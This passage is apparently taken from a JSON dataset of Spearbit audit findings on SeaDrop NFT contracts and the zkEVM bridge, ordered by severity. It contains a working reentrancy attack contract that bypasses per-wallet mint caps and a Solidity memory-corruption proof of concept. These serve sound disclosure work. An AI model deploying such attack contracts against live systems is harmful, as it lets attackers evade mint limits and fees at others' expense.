(SeaDrop.sol#L187-L194).",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "In case of a mintPublic call, the function _checkMintQuantity checks whether the minter has exceeded the parameter maxMintsPerWallet, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check. The following is an example contract that can be employed by the feeRecipent (assume that maxMintsPerWallet is 1): 7 contract MaliciousRecipient { bool public startAttack; address public token; SeaDrop public seaDrop; fallback() external payable { if (startAttack) { startAttack = false; seaDrop.mintPublic{value: 1 ether}({ nftContract: token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); } } // Call `attack` with at least 2 ether. function attack(SeaDrop _seaDrop, address _token) external payable { token = _token; seaDrop = _seaDrop; startAttack = true; _seaDrop.mintPublic{value: 1 ether}({ nftContract: _token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); token = address(0); seaDrop = SeaDrop(address(0)); } } This is especially bad when the parameter PublicDrop.restrictFeeRecipients is set to false, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users, i.e., should be part of _allowedFeeRecipients[nftContract] mapping, would be able to circumvent the check--lower severity due to needed privileged access. Also, creatorPaymentAddress can use re-entrancy to get around the same check. See SeaDrop.sol#L571.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Cross SeaDrop reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The contract that implements IERC721SeaDrop can work with multiple Seadrop implementations, for example, a Seadrop that accepts ETH as payment as well as another Seadrop contract that accepts USDC as payment at the same time. This introduces the risk of cross contract re-entrancy that can be used to circumvent the maxMintsPerWallet check. Here's an example of the attack: 1. Consider an ERC721 token that that has two allowed SeaDrop, one that accepts ETH as payment and the other that accepts USDC as payment, both with public mints and restrictedFeeRecipients set to false. 2. Let maxMintPerWallet be 1 for both these cases. 3. A malicious fee receiver can now do the following:  Call mintPublic for the Seadrop with ETH fees, which does the _checkMintQuantity check and trans- fers the fees in ETH to the receiver.  The receiver now calls mintPublic for Seadrop with USDC fees, which does the _checkMintQuantity check that still passes.  The mint succeeds in the Seadrop-USDC case.  The mint succeeds in the Seadrop-ETH case.  The minter has 2 NFTs even though it's capped at 1. Even if a re-entrancy lock is added in the SeaDrop, the same issue persists as it only enters each Seadrop contract once.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of replay protection for mintAllowList and mintSigned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "merkle proofs) there are no checks that prevent re-using the same signature or Merkle proof multiple This is indirectly enforced by the _checkMintQuantity function that checks the mint statistics times. using exceeds maxMintsPerWallet. Replays can happen if a wallet does not claim all of maxMintsPerWallet in one transaction. For example, assume that maxMintsPerWallet is set to 2. A user can call mintSigned with a valid signature and quantity = 1 twice. IERC721SeaDrop(nftContract).getMintStats(minter) reverting quantity and the if Typically, contracts try to avoid any forms of signature replays, i.e., a signature can only be used once. This simpli- fies the security properties. In the current implementation of the ERC721Seadrop contract, we couldn't see a way to exploit replay protection to mint beyond what could be minted in a single initial transaction with the maximum value of quantity supplied. However, this relies on the contract correctly implementing IERC721SeaDrop.getMintStats.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The digest in SeaDrop.mintSigned is not calculated correctly according to EIP-712",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintParams in the calculation of the digest in mintSigned is of struct type, so we would need to calculate and use its hashStruct , not the actual variable on its own.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721A has mint caps that are not checked by ERC721SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "ERC721SeaDrop inherits from ERC721A which packs balance, numberMinted, numberBurned, and an extra data chunk in 1 storage slot (64 bits per substorage) for every address. This would add an inherent cap of 264 (cid:0) 1 to all these different fields. Currently, there is no check in ERC721A's _mint for quantity nor in ERC721SeaDrop's mintSeaDrop function. Also, if we almost reach the max cap for a balance by an owner and someone else transfers a token to this owner, there would be an overflow for the balance and possibly the number of mints in the _packedAddressData. The overflow could possibly reduce the balance and the numberMinted to a way lower numer and numberBurned to a way higher number",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721SeaDrop owner can choose an address they control as the admin when the constructor is called.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The owner/creator can call the contract directly (skip using the UI) and set the administrator as themselves or another address that they can control. Then after they create a PublicDrop or TokenGatedDrop, they can call either updatePublicDropFee or updateTokenGatedDropFee and set the feeBps to  zero  or another number and also call the updateAllowedFeeRecipient to add the same or another address they control as a feeRecipient. This way they can circumvent the protocol fee.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721SeaDrop's admin would need to set feeBps manually after/before creation of each drop by the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "When an owner of a ERC721SeaDrop token creates either a public or a token gated drop by calling updatePublicDrop or updateTokenGatedDrop, the PublicDrop.feeBps/TokenGatedDropStage.feeBps is initially set to 0. So the admin would need to set the feeBps parameter at some point (before or after). Forgetting to set this parameter results in not receiving the protocol fees.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "owner can reset feeBps set by admin for token gated drops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Only the admin can call updateTokenGatedDropFee to update feeBps. However, the owner can call updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata drop- Stage) twice after that to reset the feeBps to 0 for a drop. 1. Once with dropStage.maxTotalMintableByWallet equal to 0 to wipe out the storage on the SeaDrop side. 2. Then with the same allowedNftToken address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with feeBps equal to 0). NOTE: This type of attack does not apply to updatePublicDrop and updatePublicDropFee pair. Since updatePub- licDrop cannot remove or update the feeBps. Once updatePublicDropFee is called with a specific feeBps that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (_publicDrops[msg.sender] = pub- licDrop). And any number of consecutive calls to updatePublicDrop with any parameters cannot change the already set feeBps.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Update the start token id for ERC721SeaDrop to 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "ERC721SeaDrop's mintSeaDrop uses _mint from ERC721A library which starts the token ids for minting from 0. /// contracts/ERC721A.sol#L154-L156 /** * @dev Returns the starting token ID. * To change the starting token ID, please override this function. */ function _startTokenId() internal view virtual returns (uint256) { return 0; }",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Update the ERC721A library due to an unpadded toString() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The audit repo uses ERC721A at dca00fffdc8978ef517fa2bb6a5a776b544c002a which does not add a trailing zero padding to the returned string. Some projects have had issues reusing the toString() where the off-chain call returned some dirty-bits at the end (similar to Seaport 1.0's name()).",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Warn contracts implementing IERC721SeaDrop to revert on quantity == 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There are no checks in Seadrop that prevents minting for the case when quantity == 0. This would call the function mintSeadrop(minter, quantity) for a contract implementing IERC721SeaDrop with quantity == 0. It is up to the implementing contract to revert in such cases. The ERC721A library reverts when quantity == 0--the correct behaviour. However, there has been instances in the past where ignoring quantity == 0 checks have led to security issues.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing parameter in _SIGNED_MINT_TYPEHASH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "A parameter is missing (uint256 maxTokenSupplyForStage) and got caught after reformatting.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing address(0) check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "All update functions having an address as an argument check them against address(0). This is missing in updateTokenGatedDrop. This is also not protected in ERC721SeaDrop.sol#updateTokenGatedDrop(), so address(0) could pass as a valid value.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk SeaDrop.sol#L856, SeaDrop.sol#L907-L909, SeaDrop.sol#L927-L929, SeaDrop.sol#L966-L968,"
        ]
    },
    {
        "title": "Missing boundary checks on feeBps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There's a missing check when setting feeBps from ERC721SeaDrop.sol while one exists when the value is used at a later stage in Seadrop.sol, which could cause a InvalidFeeBps error.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Upgrade openzeppelin/contracts's version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There are known vulnerabilities in the current @openzeppelin/contracts version used. This affects SeaDrop.sol with a potential Improper Verification of Cryptographic Signature vulnerability as ECDSA.recover is used.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "struct TokenGatedDropStage is expected to fit into 1 storage slot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "struct TokenGatedDropStage is expected to be tightly packed into 1 storage slot, as per announced in its @notice tag. However, the struct actually takes 2 slots. This is unexpected, as only one slot is loaded in the dropStageExists assembly check.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Avoid expensive iterations on removal of list elements by providing the index of element to be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Iterating through an array (address[] storage enumeration) to find the desired element (address toRemove) can be an expensive operation. Instead, it would be best to also provide the index to be removed along with the other parameters to avoid looping over all elements. Also note in the case of _removeFromEnumeration(signer, enumeratedStorage), hopefully, there wouldn't be too many signers corresponding to a contract. So practically, this wouldn't be an issue. But something to note. Although the owner or admin can stuff the signer list with a lot of signers as the other person would not be able to remove from the list (DoS attack). For example, if the owner has stuffed the signer list with malicious signers, the admin would not be able to remove them.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "mintParams.allowedNftToken should be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintParams.allowedNftToken is accessed several times in the mintAllowedTokenHolder function. It would be cheaper to cache it: // Put the allowedNftToken on the stack for more efficient access. address allowedNftToken = mintParams.allowedNftToken;",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Immutables which are calculated using keccak256 of a string literal can be made constant.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Since Solidity 0.6.12, keccak256 expressions are evaluated at compile-time: Code Generator: Evaluate keccak256 of string literals at compile-time. The suggestion of marking these expressions as immutable to save gas isn't true for compiler versions >= 0.6.12. As a reminder, before that, the occurrences of constant keccak256 expressions were replaced by the expressions instead of the computed values, which added a computation cost.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Combine a pair of mapping to a list and mapping to a mapping into mapping to a linked-list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "SeaDrop uses 3 pairs of mapping to a list and mapping to a mapping that can be combined into just one mapping. The pairs: 1. _allowedFeeRecipients and _enumeratedFeeRecipients 2. _signers and _enumeratedSigners 3. _tokenGatedDrops and _enumeratedTokenGatedTokens Here we have variables that come in pairs. One variable is used for data retrievals (a flag or a custom struct) and the other for iteration/enumeration. mapping(address => mapping(address => CustomStructOrBool)) private variable; mapping(address => address[]) private _enumeratedVariable;",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The onlyAllowedSeaDrop modifier is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The onlyAllowedSeaDrop modifier is always used next to another one (onlyOwner, onlyAdminis- trator or onlyOwnerOrAdministrator). As the owner, which is the least privileged role, already has the privilege to update the allowed SeaDrop registry list for this contract (by calling updateAllowedSeaDrop), this makes this second modifier redundant.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop in ERC721SeaDrop to save storage and gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop into just one variable using a cyclic linked-list data structure. This would reduce storage space and save gas when storing or retrieving parameters.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "<array>.length should not be looked up in every loop of a for-loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Reading an array's length at each iteration of a loop consumes more gas than necessary.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "A storage pointer should be cached instead of computed multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Caching a mapping's value in a local storage variable when the value is accessed multiple times saves gas due to not having to perform the same offset calculation every time.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Comparing a boolean to a constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "mintAllowList, mintSigned, or mintAllowedTokenHolder have an inherent cap for minting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintAllowedTokenHolder is stored in a uint40 (after this audit uint32) which limits the maximum token id that can be minted using mintAllowList, mintSigned, or mintAllowedTokenHolder.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider replacing minterIfNotPayer parameter to always correspond to the minter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Currently, the variable minterIfNotPayer is treated in the following way: if the value is 0, then msg.sender would be considered as the minter. Otherwise, minterIfNotPayer would be considered as the minter. The logic can be simplified to always treat this variable as the minter. The 0 can be replaced by setting msg.sender as minterIfNotPayer. The variable should then be renamed as well--we recommend calling it minter afterwards.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "The interface IERC721ContractMetadata does not extend IERC721 interface",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The current interface IERC721ContractMetadata does not include the ERC-721 functions. As a comparision, OpenZeppelin's IERC721Metadata.sol extends the IERC721 interface.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unit tests for mintSigned and mintAllowList in SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The only test for the mintSigned and the mintAllowList functions are fuzz tests.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename a variable with a misleading name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "enumeratedDropsLength variable name in SeaDrop._removeFromEnumeration is a bit misleading since _removeFromEnumeration is used also for signer lists, feeRecipient lists, etc..",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "The protocol rounds the fees in the favour of creatorPaymentAddress",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The feeAmount calculation rounds down, i.e., rounds in the favour of creatorPaymentAddress and against feeRecipient. For a minuscule amount of ETH (price such that price * feeBps < 10000), the fees received by the feeRecipient would be 0. An interesting case here would be if the value quantity * price * feeBps is greater than or equal to 10000 and price * feeBps < 10000. In this case, the user can split the mint transaction into multiple transactions to skip the fees. However, this is unlikely to be profitable, considering the gas overhead involved as well as the minuscule amount of savings.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using type(uint).max as the magic value for maxTokenSupplyForStage instead of 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The value 0 is currently used as magic value to mean that maxTokenSupplyForStage to mean that the check quantity + currentTotalSupply > maxTokenSupplyForStage. However, the value type(uint).max is a more appropriate magic value in this case. This also avoids the need for additional branching if (maxTo- kenSupplyForStage != MAGIC_VALUE) as the condition quantity + currentTotalSupply > type(uint).max is never true.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing edge case tests on uninitialized AllowList",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The default value for _allowListMerkleRoots[nftContract] is 0. A transaction that tries to mint an NFT in this case with an empty proof (or any other proof) should revert. There were no tests for this case.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider naming state variables as public to replace the user-defined getters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Several state variables, for example, mapping(address => PublicDrop) private _publicDrops; but have corresponding getters defined (function getPublicDrop(address have private visibility, nftContract)). Replacing private by public and renaming the variable name can decrease the code. There are several examples of the above pattern in the codebase, however we are only listing one here for brevity.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use bytes.concat instead of abi.encodePacked for concatenation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "While one of the uses of abi.encodePacked is to perform concatenation, the Solidity language does contain a reserved function for this: bytes.concat.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The comment says // Check that the sender is the owner of the allowedNftTokenId.. However, minter isn't necessarily the sender due to how it's set: address minter = minterIfNotPayer != address(0) ? minterIfNotPayer : msg.sender;.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use i instead of j as an index name for a non-nested for-loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Using an index named j instead of i is confusing, as this naming convention makes developers expect that the for-loop is nested, but this is not the case. Using i is more standard and less surprising.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid duplicating code for consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The _checkActive function is used in every mint function besides mintPublic where the code is almost the same.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "restrictFeeRecipients is always true for either PublicDrop or TokenGatedDrop in ERC721SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "restrictFeeRecipients is always true for either PublicDrops or TokenGatedDrops. When either one of these drops gets created/updated by calling one of the four functions below on a ERC721SeaDrop contract, its value is hardcoded as true:  updatePublicDrop  updatePublicDropFee  updateTokenGatedDrop  updateTokenGatedDropFee",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reformat lines for better readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "These lines are too long to be readable. A mistake isn't easy to spot.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment is a copy-paste",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "This comment is exactly the same as this one. This is a copy-paste mistake.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of floating pragma is not recommended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": " 0.8.11 is declared in files.  In foundry.toml: solc_version = '0.8.15' is used for the default build profile.  In hardhat.config.ts and hardhat-coverage.config.ts: \"0.8.14\" is used. 31",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Funds can be sent to a non existing destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fee on transfer tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridge contract will not work properly with a fee on transfer tokens 1. User A bridges a fee on transfer Token A from Mainnet to Rollover R1 for amount X. 2. In that case X-fees will be received by bridge contract on Mainnet but the deposit receipt of the full amount X will be stored in Merkle. 3. The amount is claimed in R1 and a new TokenPair for Token A is generated and the full amount X is minted to User A 4. Now the full amount is bridged back again to Mainnet 5. When a claim is made on Mainnet then the contract tries to transfer amount X but since it received the amount X-fees it will use the amount from other users, which eventually causes DOS for other users using the same token",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Function consolidatePendingState() can be executed during emergency state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function consolidatePendingState() can be executed by everyone even when the contract is in an emergency state. This might interfere with cleaning up the emergency. Most other functions are disallowed during an emergency state. function consolidatePendingState(uint64 pendingStateNum) public { if (msg.sender != trustedAggregator) { require(isPendingStateConsolidable(pendingStateNum),...); } _consolidatePendingState(pendingStateNum); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sequencers can re-order forced and non-forced batches",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Sequencers have a certain degree of control over how non-forced and forced batches are ordered. Consider the case where we have two sets of batches; non-forced (NF) and forced (F). A sequencer can order the following sets of batches (F1, F2) and (NF1, NF2) in any order so as long as the order of the forced batch and non-forced batch sets are kept in order. i.e. A sequencer can sequence batches as F1 -> NF1 -> NF2 -> F2 but they can also equivalently sequence these same batches as NF1 -> F1 -> F2 -> NF2.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check length of smtProof",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "An obscure Solidity bug could be triggered via a call in solidity 0.4.x. Current solidity versions revert with panic 0x41. The problem could occur if unbounded memory arrays were used. This situation happens to be the case as verifyMerkleProof() (and all the functions that call it) dont check the length of the array (or loop over the entire array). It also depends on memory variables (for example structs) being used in the functions, that doesnt seem to be the case. Here is a POC of the issue which can be run in remix // SPDX-License-Identifier: MIT // based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol , pragma solidity ^0.4.24; // only works with low solidity version import \"hardhat/console.sol\"; contract test{ struct Overlap { uint field0; } function mint(uint[] memory amounts) public { Overlap memory v; console.log(\"before: \",amounts[0]); v.field0 = 567; console.log(\"after: \",amounts[0]); // would expect to be 0 however is 567 } function go() public { // this part requires the low solidity version bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, 2**251); bool success = address(this).call(payload); console.log(success); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Transaction delay due to free claimAsset() transactions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The sequencer rst processes the free claimAsset() transaction and then the rest. This might delay other transactions if there are many free claimAsset() transactions. As these transactions would have to be initiated on the mainnet, the gas costs there will reduce this problem. However, once multiple rollups are supported in the future the transactions could originate from another rollup with low gas costs. func (s *Sequencer) tryToProcessTx(ctx context.Context, ticker *time.Ticker) { ... appendedClaimsTxsAmount := s.appendPendingTxs(ctx, true, 0, getTxsLimit, ticker) // `claimAsset()` transactions , appendedTxsAmount := s.appendPendingTxs(ctx, false, minGasPrice.Uint64(), getTxsLimit-appendedClaimsTxsAmount, ticker) + appendedClaimsTxsAmount , ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Misleading token addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimAsset() deploys TokenWrapped contracts via create2 and a salt. This salt is based on the originTokenAddress. By crafting specic originTokenAddresses, its possible to create vanity addresses on the other chain. These addresses could be similar to legitimate tokens and might mislead users. Note: it is also possible to directly deploy tokens on the other chain with vanity addresses (e.g. without using the bridge) function claimAsset(...) ... { ... bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } 8",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit amount of gas for free claimAsset() transactions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function claimAsset() is subsidized (e.g. gasprice is 0) on L2 and allows calling a custom contract. This could be misused to execute elaborate transactions for free. Note: safeTransfer could also call a custom contract that has been crafted before and bridged to L1. Note: this is implemented in the Go code, which detects transactions to the bridge with function bridgeClaimMethodSignature == \"0x7b6323c1\", which is the selector of claimAsset(). See function IsClaimTx() in transaction.go. function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "What to do with funds that cant be delivered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
